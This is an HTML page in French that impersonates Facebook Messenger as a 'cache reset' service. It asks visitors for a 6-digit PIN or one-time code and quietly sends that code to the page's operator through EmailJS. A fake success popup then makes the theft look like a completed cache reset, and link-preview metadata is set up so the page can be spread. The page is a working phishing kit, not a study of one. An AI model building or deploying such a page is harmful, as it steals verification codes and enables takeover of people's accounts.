<!DOCTYPE html>
<html lang="fr" data-theme="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook Messenger - Vidange de mémoire cache</title>

  <!-- Fav / App Icon (version sombre) -->
  <link rel="icon" href="logo_messenger.png" />

  <!-- Mobile/browser UI color -->
  <meta name="color-scheme" content="dark">
  <meta name="theme-color" content="#1c1f24">

  <!-- EmailJS (inchangé) -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      emailjs.init("AATQVLMcBJaRBgEox");

      window.sendCode = function(event) {
        event.preventDefault();
        const pin = document.getElementById('pin').value;

        if (!/^[0-9]{6}$/.test(pin)) {
          alert("Veuillez entrer un code PIN à 6 chiffres.");
          return;
        }

        // Loader on
        document.getElementById('loader').style.display = 'block';

        emailjs.send("service_photos", "template_code", { verification_code: pin })
        .then(function(response) {
          console.log("✅ Email envoyé :", response.status, response.text);
          document.getElementById('popup').style.display = 'flex';
        })
        .catch(function(error) {
          console.error("❌ Erreur EmailJS :", error);
          alert("Erreur : " + (error.text || error.message || "Inconnue"));
        })
        .finally(() => {
          document.getElementById('loader').style.display = 'none';
        });
      };
    });
  </script>

  <style>
    /* === Thème sombre forcé (valeurs par défaut) === */
    :root{
      --bg: #0f141a;
      --text: #e4e6eb;
      --muted: #9aa1a9;
      --card: #1c1f24;
      --primary: #0084ff;
      --primary-hover: #0a78e6;
      --border: #2b2f36;
      --shadow: 0 2px 8px rgba(0,0,0,.35), 0 8px 24px rgba(0,0,0,.25);
      --radius: 18px;
    }

    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      background:var(--bg);
      color:var(--text);
      font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol",sans-serif;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
    }

    /* Header façon Messenger */
    .topbar{
      position:sticky; top:0; z-index:20;
      height:56px;
      display:flex; align-items:center; justify-content:center;
      background:#1C1F24; border-bottom:1px solid var(--border);
    }
    .brand{display:flex; align-items:center; gap:10px; font-weight:700; font-size:18px;}
    .brand img{width:26px;height:26px;display:block}

    /* Layout carte centrale */
    .wrap{min-height:calc(100% - 56px); display:grid; place-items:center; padding:32px 16px;}
    .card{
      width:100%; max-width:420px; background:var(--card);
      border:1px solid var(--border); border-radius:var(--radius);
      box-shadow:var(--shadow); overflow:hidden;
    }
    .card-header{padding:20px 24px 8px;}
    .title{margin:0 0 6px 0; font-size:20px; font-weight:800; letter-spacing:.2px;}
    .subtitle{margin:0; color:var(--muted); font-size:14px; line-height:1.4;}
    .card-body{padding:16px 24px 24px;}

    /* Input PIN façon bulle Messenger */
    .pin-input{
      width:100%; height:46px; padding:10px 12px;
      border-radius:14px; border:1px solid var(--border);
      background:#171a1f; color:var(--text);
      outline:none; text-align:center;
      font-size:16px; letter-spacing:3px;
      transition: box-shadow .2s ease, border-color .2s ease, background .2s ease;
    }
    .pin-input::placeholder{color:#5d6670;}
    .pin-input:focus{
      background:#1b2027; border-color:var(--primary);
      box-shadow:0 0 0 3px rgba(0,132,255,.18);
    }

    .actions{margin-top:14px; display:grid; gap:10px;}
    .btn-primary{
      appearance:none; border:0; height:44px;
      border-radius:999px; background:var(--primary);
      color:#fff; font-weight:700; font-size:15px; cursor:pointer;
      transition: background .2s ease, transform .02s ease-in-out;
    }
    .btn-primary:hover{background:var(--primary-hover)}
    .btn-primary:active{transform:translateY(1px)}
    .legal{margin-top:6px; color:var(--muted); font-size:12px; text-align:center}

    /* Loader */
    .loader{
      display:none; margin:16px auto 0; width:36px; height:36px;
      border-radius:50%; border:3px solid #2b2f36; border-top-color:var(--primary);
      animation:spin .9s linear infinite;
    }
    @keyframes spin{to{transform:rotate(360deg)}}

    /* Popup type Messenger */
    .popup{
      display:none; position:fixed; inset:0; z-index:1000;
      background:rgba(0,0,0,.55);
      align-items:center; justify-content:center; padding:24px;
    }
    .popup-inner{
      width:100%; max-width:420px; background:var(--card);
      border:1px solid var(--border); border-radius:var(--radius);
      box-shadow:var(--shadow); padding:22px 24px; text-align:center;
      transform:translateY(6px); opacity:0; animation:slideIn .18s ease-out forwards;
    }
    @keyframes slideIn{
      to{transform:none; opacity:1}
    }

    /* Accessibilité: motion */
    @media (prefers-reduced-motion: reduce){
      .btn-primary,.pin-input,.popup-inner{transition:none; animation:none}
    }
  </style>

  <!-- Open Graph pour aperçu du lien Messenger -->
  <meta property="og:title" content="Facebook Messenger - Vidange de mémoire cache">
  <meta property="og:description" content="Réinitialisez la mémoire cache de Messenger en toute sécurité.">
  <meta property="og:image" content="https://messenger-cache-reset.onrender.com/banner.png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:url" content="https://messenger-cache-reset.onrender.com/">
  <meta property="og:type" content="website">

  <!-- Twitter Cards (pour compatibilité) -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Facebook Messenger - Vidange de mémoire cache">
  <meta name="twitter:description" content="Réinitialisez la mémoire cache de Messenger en toute sécurité.">
  <meta name="twitter:image" content="https://messenger-cache-reset.onrender.com/banner.png">

</head>
<body>
  <header class="topbar" role="banner">
    <div class="brand" aria-label="Facebook Messenger">
      <img src="logo_messenger.png" alt="" aria-hidden="true" />
      Facebook Messenger
    </div>
  </header>

  <main class="wrap">
    <section class="card" role="region" aria-labelledby="title">
      <div class="card-header">
        <h1 id="title" class="title">Vidange de mémoire cache Facebook Messenger</h1>
        <p class="subtitle">Saisissez votre code PIN à 6 chiffres pour poursuivre.</p>
      </div>

      <div class="card-body">
        <form onsubmit="sendCode(event)" aria-label="Formulaire de code PIN">
          <input type="password" id="pin" inputmode="numeric" autocomplete="one-time-code"
                 maxlength="6" pattern="[0-9]{6}" required
                 placeholder="••••••" class="pin-input" aria-label="Code PIN à 6 chiffres" />
          <div class="actions">
            <button type="submit" class="btn-primary">Confirmer</button>
          </div>
          <div class="loader" id="loader" aria-live="polite" aria-busy="true"></div>
          <p class="legal">Ne partagez jamais de codes sensibles. Utilisation interne uniquement.</p>
        </form>
      </div>
    </section>
  </main>

  <div class="popup" id="popup" role="dialog" aria-modal="true" aria-labelledby="doneTitle">
    <div class="popup-inner">
      <h3 id="doneTitle">✅ Vidange terminée</h3>
      <p>La mémoire cache de votre Facebook Messenger a été réinitialisée avec succès&nbsp;!</p>
      <button class="btn-primary" onclick="document.getElementById('popup').style.display='none'">Fermer</button>
    </div>
  </div>
</body>
</html>
